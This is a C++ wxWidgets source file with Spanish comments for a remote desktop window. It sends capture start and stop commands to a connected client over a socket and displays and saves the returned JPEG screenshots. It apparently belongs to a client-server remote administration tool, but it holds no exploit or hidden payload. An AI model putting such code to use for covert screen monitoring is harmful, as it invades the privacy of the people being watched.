#include "frame_remote_desktop.hpp"
#include "frame_client.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(frameRemoteDesktop, wxFrame)
	EVT_CLOSE(frameRemoteDesktop::Onclose)
	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Single, frameRemoteDesktop::OnSingle)
	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Start, frameRemoteDesktop::OnStart)
	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Stop, frameRemoteDesktop::OnStop)
	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Save, frameRemoteDesktop::OnSave)
wxEND_EVENT_TABLE()

frameRemoteDesktop::frameRemoteDesktop(wxWindow* pParent) :
	wxFrame(pParent, EnumRemoteDesktop::ID_Main_Frame, "Escritorio Remoto", wxDefaultPosition, wxSize(600, 400)) {
	//Crear controles en la parte superior
	//  [Iniciar] [Detener]  [Guardar Captura]  [] CheckBox para controlar mouse y teclado
	//  Resolution Fastest | Low | Medium | High
	wxImage::AddHandler(new wxJPEGHandler);

	wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
	if (wxTree) {
		wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
		if (panel_cliente) {
			FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
			if (frame_cliente) {
				this->sckCliente = frame_cliente->sckCliente;
			}
		}
	}
	
	// - - - - - - - - - CONTROLES PRINCIPALES  - - - - - - - - - 
	wxButton* btn_Single = new wxButton(this, EnumRemoteDesktop::ID_BTN_Single, "Tomar Captura");
	wxButton* btn_Iniciar = new wxButton(this, EnumRemoteDesktop::ID_BTN_Start, "Iniciar");
	wxButton* btn_Detener = new wxButton(this, EnumRemoteDesktop::ID_BTN_Stop, "Detener");
	wxButton* btn_Guardar = new wxButton(this, EnumRemoteDesktop::ID_BTN_Save, "Guardar Captura");
	wxCheckBox* chk_Control = new wxCheckBox(this, EnumRemoteDesktop::ID_CHK_Control, "Control Remoto (mouse y teclado)");
	
	wxBoxSizer* sizer_controles = new wxBoxSizer(wxHORIZONTAL);

	sizer_controles->Add(btn_Single);
	sizer_controles->Add(btn_Iniciar);
	sizer_controles->Add(btn_Detener);
	sizer_controles->Add(btn_Guardar);
	sizer_controles->Add(chk_Control);
	// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

	this->imageCtrl = new wxStaticBitmap(this, EnumRemoteDesktop::ID_Bitmap, wxBitmap(10,10));
	this->imageCtrl->SetScaleMode(wxStaticBitmap::ScaleMode::Scale_AspectFit);

	wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);

	main_sizer->Add(sizer_controles, 0, wxEXPAND | wxALL, 2);
	main_sizer->Add(this->imageCtrl, 1, wxEXPAND | wxALL, 2);

	this->SetSizer(main_sizer);
	this->Layout();
	
}

void frameRemoteDesktop::OnSingle(wxCommandEvent&) {
	std::string strComando = std::to_string(EnumComandos::RD_Single);
	strComando.append(1, CMD_DEL);
	strComando += "24"; //quality
	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
}

void frameRemoteDesktop::OnStart(wxCommandEvent&) {
	std::string strComando = std::to_string(EnumComandos::RD_Start);
	strComando.append(1, CMD_DEL);
	strComando += "24"; //quality
	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
}

void frameRemoteDesktop::OnStop(wxCommandEvent&) {
	std::string strComando = std::to_string(EnumComandos::RD_Stop);
	strComando.append(1, CMD_DEL);
	strComando.append(1, '0');
	int iSent = p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
}

void frameRemoteDesktop::OnSave(wxCommandEvent&) {
	wxFileDialog dialog(this, "Guardar frame", wxEmptyString, "captura.jpg", wxFileSelectorDefaultWildcardStr, wxFD_SAVE | wxFD_OVERWRITE_PROMPT);
	if (dialog.ShowModal() == wxID_OK) {
		if (!this->imageCtrl->GetBitmap().SaveFile(dialog.GetPath(), wxBITMAP_TYPE_JPEG)) {
			wxMessageBox("No se pudo guardar " + dialog.GetPath(), "Error", wxID_OK);
		}
	}
}

void frameRemoteDesktop::OnDrawBuffer(const char* cBuffer, int iBuffersize) {
	if (iBuffersize > 0) {
		wxMemoryInputStream imgStream(cBuffer, iBuffersize);
		wxImage img(imgStream, wxBITMAP_TYPE_JPEG);
		
		//wxIMAGE_QUALITY_FAST   Fast but same as wxIMAGE_QUALITY_NEAREST 
		//wxIMAGE_QUALITY_HIGH   best quality
		int x = this->GetSize().GetWidth()- 30;
		int y = this->GetSize().GetHeight() - 90;
		img.Rescale(x, y, wxIMAGE_QUALITY_FAST);
		if (img.IsOk()) {
			wxBitmap bmp_Obj(img);
			
			if (this->imageCtrl) {
				this->imageCtrl->SetBitmap(bmp_Obj);
				this->Refresh();
				this->Update();
			}
		}
	}
}

void frameRemoteDesktop::Onclose(wxCloseEvent&) {
	std::string strComando = std::to_string(EnumComandos::RD_Stop);
	strComando.append(1, CMD_DEL);
	strComando.append(1, '0');
	int iSent = p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
	Sleep(1000);
	Destroy();
}